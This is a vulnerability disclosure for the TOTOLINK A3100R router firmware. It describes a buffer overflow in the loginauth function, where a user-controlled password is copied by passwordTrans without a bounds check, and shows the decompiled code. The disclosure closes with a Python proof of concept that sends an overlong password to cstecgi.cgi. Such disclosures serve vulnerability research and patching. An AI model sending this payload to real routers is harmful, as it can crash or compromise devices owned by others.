## Overview

- Manufacturer's website information：https://www.totolink.net/
- Firmware download address ：https://www.totolink.net/home/menu/detail/menu_listtpl/download/id/170/ids/36.html

## Affected version

A3100R V4.1.2cu.5050_B20200504

## Vulnerability details

In the A3100R V4.1.2cu.5050_B20200504 firmware has a buffer overflow vulnerability in the `loginauth` function. The `v10` variable receives the `password` parameter from a POST request. However, since the user can control the input of `password`, the statement `passwordTrans((int)v10, v28);` can cause a buffer overflow injection vulnerability.

![image-20240719230438781](https://raw.githubusercontent.com/abcdefg-png/images2/main/image-20240719230438781.png)

```c
int __fastcall passwordTrans(int a1, _BYTE *a2)
{
  _BYTE *v3; // $s5
  _BYTE *v4; // $s2
  int v5; // $s1
  int v6; // $s0
  int result; // $v0

  v3 = a2;
  v4 = a2;
  v5 = 1;
  v6 = 0;
  while ( 1 )
  {
    result = *(char *)(a1 + v6);
    if ( !*(_BYTE *)(a1 + v6) )
      break;
    if ( result == 37 )
    {
      *v4 = hextochar(*(char *)(a1 + v6 + 1), *(char *)(a1 + v6 + 2));
      v6 += 3;
    }
    else
    {
      *v4 = result;
      ++v6;
    }
    ++v5;
    ++v4;
  }
  v3[v5 - 1] = 0;
  return result;
}
```

## POC

```python
import requests
url = "http://127.0.0.1/cgi-bin/cstecgi.cgi"
cookie = {"Cookie":"SESSION_ID=2:1721039211:2"}
data = {"username":"admin","password":"aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa","flag":"0","topicurl":"loginAuth"}
response = requests.post(url, cookies=cookie, json=data)
print(response.text)
print(response)
```

![image-20240719230419523](https://raw.githubusercontent.com/abcdefg-png/images2/main/image-20240719230419523.png)
